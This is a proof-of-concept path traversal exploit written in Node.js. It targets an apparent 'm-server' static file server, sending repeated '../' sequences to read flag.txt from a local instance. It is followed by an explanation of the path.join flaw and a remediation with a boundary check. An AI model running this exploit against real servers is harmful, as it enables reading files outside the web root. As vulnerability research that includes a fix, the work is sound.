const http = require('http');

async function exploit() {
    // Target server configuration (adjust PORT to match your HttpServer instance)
    const HOST = '127.0.0.1';
    const PORT = 3000;

    // Crafted path traversal payload designed to escape the intended root directory
    // The number of '../' sequences required depends on the depth of the configured `rootPath`
    const traversalDepth = 6;
    const payloadPath = '../'.repeat(traversalDepth) + 'flag.txt';

    // Construct the HTTP request path (prepend '/' for proper routing)
    const requestPath = `/${payloadPath}`;
    const fullUrl = `http://${HOST}:${PORT}${requestPath}`;

    console.log(`[*] Triggering path traversal at: ${fullUrl}`);

    // Execute the GET request. DNS, TCP/connection, or protocol errors will propagate as expected.
    const response = await new Promise((resolve, reject) => {
        http.get(
            { hostname: HOST, port: PORT, path: requestPath, method: 'GET' },
            resolve
        ).on('error', reject); 
    });

    let body = '';
    for await (const chunk of response) body += chunk;

    console.log(`[+] HTTP Status Code: ${response.statusCode}`);
    console.log('[+] Response Content:\n', body);
}

await exploit();
```

### 🔍 Why This Demonstrates the Vulnerability

1. **Unsanitized Input in `path.join`**: The vulnerable code constructs the target file path using `var targetPath = path.join(rootPath, req.url);`. Node's `path.join` normalizes consecutive slashes and resolves `.`/`..` sequences **without validating whether the result remains inside `rootPath`**. When `req.url` contains `../../../../../`, the OS path resolver interprets these as "go up one directory level".
2. **Directory Escapement**: If `rootPath` is set to something like `/var/www/html` (3 levels deep), a payload of 5-6 `../` sequences will navigate out of the web root and resolve to absolute system paths like `/home/user/flag.txt` or `/flag.txt`. The server then proceeds to read and return the file contents because `fs.existsSync()` returns `true` for the resolved path.
3. **Demonstration in Code**: This PoC constructs exactly that crafted URL and sends it via an HTTP GET request. When executed against a running instance of `m-server`, the server fails to reject the traversal payload, resolves `targetPath` outside its intended boundary, reads the file, and returns it with a `200 OK` status (or a directory listing of the parent directory if the exact filename isn't known). The output clearly shows files that should not be accessible through the web root.

### 🛡️ Research & Remediation Notes
- **Depth Adjustment**: File path traversal depths are environment-dependent. In practice, researchers enumerate `rootPath` using tools like `path.dirname` or simple directory probes to calibrate the number of `../`.
- **Secure Fix**: Always validate that the resolved path stays within the allowed boundary:
  ```javascript
  const resolved = path.resolve(rootPath, req.url);
  if (!resolved.startsWith(path.resolve(rootPath) + path.sep)) {
      throw new Error('Invalid path traversal detected');
  }
  ```
- **Alternative**: Use a trusted file-serving library (e.g., `serve-static`, `express.static`) that inherently sanitizes and limits directory access.

This PoC operates strictly in a controlled research capacity to validate the missing input validation, enabling developers to patch the exact vector before it can be abused in production.

